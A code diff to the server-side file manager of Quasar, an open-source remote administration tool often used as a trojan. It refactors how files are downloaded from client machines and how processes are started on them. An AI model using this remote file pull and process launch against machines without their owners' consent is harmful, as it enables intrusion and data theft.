@@ -102,7 +102,7 @@ namespace Quasar.Server.Messages
             {
                 var handler = FileTransferUpdated;
                 handler?.Invoke(this, (FileTransfer)t);
-            }, transfer);
+            }, transfer.Clone());
         }
 
         /// <summary>
@@ -130,6 +130,8 @@ namespace Quasar.Server.Messages
         /// </summary>
         private readonly string _baseDownloadPath;
 
+        private readonly TaskManagerHandler _taskManagerHandler;
+
         /// <summary>
         /// Initializes a new instance of the <see cref="FileManagerHandler"/> class using the given client.
         /// </summary>
@@ -139,6 +141,9 @@ namespace Quasar.Server.Messages
         {
             _client = client;
             _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
+            _taskManagerHandler = new TaskManagerHandler(client);
+            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
+            MessageHandler.Register(_taskManagerHandler);
         }
 
         /// <inheritdoc />
@@ -147,8 +152,7 @@ namespace Quasar.Server.Messages
                                                              message is FileTransferComplete ||
                                                              message is GetDrivesResponse ||
                                                              message is GetDirectoryResponse ||
-                                                             message is SetStatusFileManager ||
-                                                             message is DoRemoteExecutionResponse;
+                                                             message is SetStatusFileManager;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
@@ -176,9 +180,6 @@ namespace Quasar.Server.Messages
                 case SetStatusFileManager status:
                     Execute(sender, status);
                     break;
-                case DoRemoteExecutionResponse execResp:
-                    Execute(sender, execResp);
-                    break;
             }
         }
 
@@ -186,7 +187,9 @@ namespace Quasar.Server.Messages
         /// Begins downloading a file from the client.
         /// </summary>
         /// <param name="remotePath">The remote path of the file to download.</param>
-        public void BeginDownloadFile(string remotePath)
+        /// <param name="localFileName">The local file name.</param>
+        /// <param name="overwrite">Overwrite the local file with the newly downloaded.</param>
+        public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
         {
             if (string.IsNullOrEmpty(remotePath))
                 return;
@@ -196,15 +199,15 @@ namespace Quasar.Server.Messages
             if (!Directory.Exists(_baseDownloadPath))
                 Directory.CreateDirectory(_baseDownloadPath);
 
-            string fileName = Path.GetFileName(remotePath);
-            string downloadPath = Path.Combine(_baseDownloadPath, fileName);
+            string fileName = string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName;
+            string localPath = Path.Combine(_baseDownloadPath, fileName);
 
             int i = 1;
-            while (File.Exists(downloadPath))
+            while (!overwrite && File.Exists(localPath))
             {
                 // rename file if it exists already
-                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(downloadPath), i, Path.GetExtension(downloadPath));
-                downloadPath = Path.Combine(_baseDownloadPath, newFileName);
+                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
+                localPath = Path.Combine(_baseDownloadPath, newFileName);
                 i++;
             }
 
@@ -212,8 +215,8 @@ namespace Quasar.Server.Messages
             {
                 Id = id,
                 Type = TransferType.Download,
-                LocalPath = downloadPath,
-                RemotePath = fileName,
+                LocalPath = localPath,
+                RemotePath = remotePath,
                 Status = "Pending...",
                 //Size = fileSize, TODO: Add file size here
                 TransferredSize = 0
@@ -379,8 +382,7 @@ namespace Quasar.Server.Messages
         /// <param name="remotePath">The remote path used for starting the new process.</param>
         public void StartProcess(string remotePath)
         {
-            // TODO: change to remote execution handler
-            _client.Send(new DoRemoteExecution {FilePath = remotePath});
+            _taskManagerHandler.StartProcess(remotePath);
         }
 
         /// <summary>
@@ -437,7 +439,7 @@ namespace Quasar.Server.Messages
 
             decimal progress = Math.Round((decimal) ((double) transfer.TransferredSize / (double) transfer.Size * 100.0), 2);
             transfer.Status = $"Downloading...({progress}%)";
-            
+
             OnFileTransferUpdated(transfer);
         }
 
@@ -472,8 +474,8 @@ namespace Quasar.Server.Messages
             {
                 transfer.RemotePath = message.FilePath; // required for temporary file names generated on the client
                 transfer.Status = "Completed";
-                OnFileTransferUpdated(transfer);
                 RemoveFileTransfer(transfer.Id);
+                OnFileTransferUpdated(transfer);
             }
         }
 
@@ -487,6 +489,10 @@ namespace Quasar.Server.Messages
         
         private void Execute(ISender client, GetDirectoryResponse message)
         {
+            if (message.Items == null)
+            {
+                message.Items = new FileSystemEntry[0];
+            }
             OnDirectoryChanged(message.RemotePath, message.Items);
         }
 
@@ -495,9 +501,10 @@ namespace Quasar.Server.Messages
             OnReport(message.Message);
         }
 
-        private void Execute(ISender client, DoRemoteExecutionResponse message)
+        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
         {
-            OnReport(message.Success ? "Process started successfully" : "Process failed to start");
+            if (action != ProcessAction.Start) return;
+            OnReport(result ? "Process started successfully" : "Process failed to start");
         }
 
         /// <summary>
@@ -549,6 +556,10 @@ namespace Quasar.Server.Messages
 
                     _activeFileTransfers.Clear();
                 }
+
+                MessageHandler.Unregister(_taskManagerHandler);
+                _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
+                _taskManagerHandler.Dispose();
             }
         }
     }
